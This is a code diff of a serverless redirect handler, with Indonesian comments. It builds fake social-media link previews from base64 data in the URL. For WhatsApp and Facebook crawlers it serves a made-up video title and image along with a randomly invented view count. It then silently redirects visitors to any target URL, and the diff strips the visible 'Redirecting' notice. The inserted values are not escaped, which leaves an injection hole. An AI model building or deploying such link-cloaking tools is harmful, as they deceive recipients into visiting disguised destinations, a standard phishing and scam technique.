@@ -2,7 +2,7 @@ export async function onRequest(context) {
     const { params } = context;
     const base64Data = params.path[0];
 
-    // Jika tidak ada data base64, biarkan halaman normal terbuka
+    // Jika tidak ada data base64, tampilkan index biasa
     if (!base64Data || base64Data === "index.html") {
         return context.next();
     }
@@ -14,7 +14,7 @@ export async function onRequest(context) {
         const image = data.i || "";
         const target = data.u || "";
 
-        // Logic Random Deskripsi (Dikerjakan di sisi server/path)
+        // Buat Angka Random (10.000 - 100.000)
         const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
         const formattedCount = count.toLocaleString('en-US');
         const templates = [
@@ -23,35 +23,28 @@ export async function onRequest(context) {
         ];
         const randomDesc = templates[Math.floor(Math.random() * templates.length)];
 
-        // HTML Mentah untuk Bot WhatsApp/Facebook
+        // HTML Response Mentah untuk WhatsApp (Tanpa nunggu JS jalan)
         const html = `<!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
     <title>${title}</title>
-    
     <meta property="og:title" content="${title}" />
     <meta property="og:description" content="▶️ ${randomDesc}" />
     <meta property="og:image" content="${image}" />
     <meta property="og:type" content="video.other" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="${image}">
-
+    
     <script>window.location.replace("${target.startsWith('http') ? target : 'https://' + target}");</script>
     <meta http-equiv="refresh" content="0;url=${target.startsWith('http') ? target : 'https://' + target}">
 </head>
-<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <p>Redirecting...</p>
-</body>
+<body style="background:#000;"></body>
 </html>`;
 
         return new Response(html, {
             headers: { "content-type": "text/html;charset=UTF-8" },
         });
     } catch (e) {
-        return new Response("Invalid URL Data", { status: 400 });
+        return context.next();
     }
 }
